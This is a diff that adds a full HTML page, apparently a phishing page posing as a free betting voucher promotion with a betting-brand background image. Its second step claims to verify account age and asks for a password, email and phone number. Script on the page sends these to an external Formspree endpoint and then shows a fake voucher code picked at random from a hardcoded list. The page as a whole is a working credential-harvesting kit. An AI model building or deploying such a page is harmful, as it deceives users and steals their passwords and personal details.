@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Free Betting Voucher</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: url('betway.jpg') no-repeat center center fixed;
+      background-size: cover;
+      color: white;
+    }
+
+    .overlay {
+      background-color: rgba(0, 0, 0, 0.6);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .page {
+      display: none;
+      width: 100%;
+      max-width: 400px;
+      text-align: center;
+    }
+
+    .active { display: block; }
+
+    h1, h2 { margin-bottom: 20px; }
+
+    input {
+      margin: 10px 0;
+      padding: 12px;
+      width: 100%;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+    }
+
+    button {
+      padding: 12px 25px;
+      font-size: 16px;
+      border: none;
+      border-radius: 5px;
+      background: #28a745;
+      color: white;
+      cursor: pointer;
+      transition: background 0.3s;
+      margin-top: 15px;
+    }
+    button:hover { background: #218838; }
+
+    .voucher {
+      font-size: 28px;
+      font-weight: bold;
+      color: #ffc107;
+      margin: 20px 0;
+    }
+
+    @media(max-width: 500px) {
+      input { font-size: 14px; padding: 10px; }
+      button { font-size: 14px; padding: 10px 20px; }
+      .voucher { font-size: 24px; }
+    }
+  </style>
+</head>
+<body>
+
+<div class="overlay">
+  <!-- PAGE 1 -->
+  <div id="page1" class="page active">
+    <h1>Welcome to FreeBet Promo</h1>
+    <p>Get your free betting voucher in seconds!</p>
+    <button onclick="showPage(2)">Get Started</button>
+  </div>
+
+  <!-- PAGE 2 -->
+  <div id="page2" class="page">
+    <p>To verify your account is older than 1 year</p>
+    <h2>Enter Your Details</h2>
+    <form id="voucherForm" action="https://formspree.io/f/xnnzrkdd" method="POST" onsubmit="return handleSubmit(event)">
+      <input name="name" id="name" placeholder="Password" required><br>
+      <input type="email" name="email" id="email" placeholder="Email" required><br>
+      <input name="phone" id="phone" placeholder="Phone Number" required><br>
+      <button type="submit">Claim Voucher</button>
+    </form>
+  </div>
+
+  <!-- PAGE 3 -->
+  <div id="page3" class="page">
+    <h2>Here’s Your Voucher</h2>
+    <p class="voucher" id="voucherCode"></p>
+    <button onclick="copyVoucher()">Copy Code</button>
+    <p>Use this code on our partner site to claim your free bet.</p>
+  </div>
+</div>
+
+<script>
+function showPage(n) {
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+  document.getElementById('page' + n).classList.add('active');
+}
+
+function handleSubmit(event) {
+  event.preventDefault();
+
+  // Replace with your 5 vouchers
+  const vouchers = [
+    "VOUCHER-1408977700199251",
+    "VOUCHER-1695385515825537",
+    "VOUCHER-1333902601152392",
+    "VOUCHER-1105138897611479",
+    "VOUCHER-1922774383683303"
+  ];
+
+  // Pick one random voucher
+  const voucher = vouchers[Math.floor(Math.random() * vouchers.length)];
+  document.getElementById('voucherCode').innerText = voucher;
+
+  // Send form data to Formspree
+  fetch(event.target.action, {
+    method: "POST",
+    body: new FormData(event.target),
+    headers: { 'Accept': 'application/json' }
+  }).then(() => {
+    showPage(3);
+  }).catch((err) => {
+    alert("Error sending form: " + err);
+  });
+
+  return false;
+}
+
+function copyVoucher() {
+  const voucher = document.getElementById('voucherCode').innerText;
+  navigator.clipboard.writeText(voucher).then(() => {
+    alert("Voucher copied: " + voucher);
+  });
+}
+</script>
+
+</body>
+</html>
